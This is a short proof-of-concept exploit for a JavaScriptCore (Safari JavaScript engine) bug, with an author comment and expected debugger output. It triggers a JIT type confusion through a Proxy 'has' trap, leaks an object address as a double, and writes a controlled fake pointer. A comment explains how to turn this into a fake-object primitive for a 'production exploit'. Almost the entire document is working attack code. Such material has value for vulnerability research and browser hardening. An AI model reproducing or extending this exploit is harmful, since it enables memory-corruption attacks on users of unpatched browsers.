/*

JSC nday found by accident, no idea what commit fixed this or when this got fixed but it appears it's a recent one

~qwertyoruiop 2019

Expected output:

$ lldb ./jsc wtf.js 
(lldb) target create "./jsc"
Current executable set to './jsc' (x86_64).
(lldb) settings set -- target.run-args  "wtf.js"
(lldb) r
Process 43641 launched: '<redacted>/jsc' (x86_64)
side effect
2.153435947e-314 (hex: 0x103cb0080)
Process 43641 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41414146)

*/


let s = new Date(); 
let confuse = new Array(13.37,13.37); 
s[1] = 1;
let hack = 0;
Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
	if (hack) {
		print("side effect");
		confuse[1] = {};
	}
}}); // this doesn't trigger type conversion of |s| into SlowPutArrayStorage

function victim(oj,f64,u32,doubleArray) {
	doubleArray[0];
	let r = 5 in oj;
	f64[0] = f64[1] = doubleArray[1];
	u32[2] = 0x41414141;
	u32[3] = 0;
	// u32[2] += 0x18; < you'd use this for an actual production exploit in order to get a fake object rather than using 0x41414141
	doubleArray[1] = f64[1];
	return r;
}

let u32 = new Uint32Array(4);
let f64 = new Float64Array(u32.buffer); 

for(let i=0; i<10000; i++) victim(s,f64,u32,confuse);
hack = 1;
victim(s,f64,u32,confuse);
print(f64[0] + " (hex: 0x" + (u32[0]+u32[1]*0x100000000).toString(16) + ")");
print(confuse[1]);

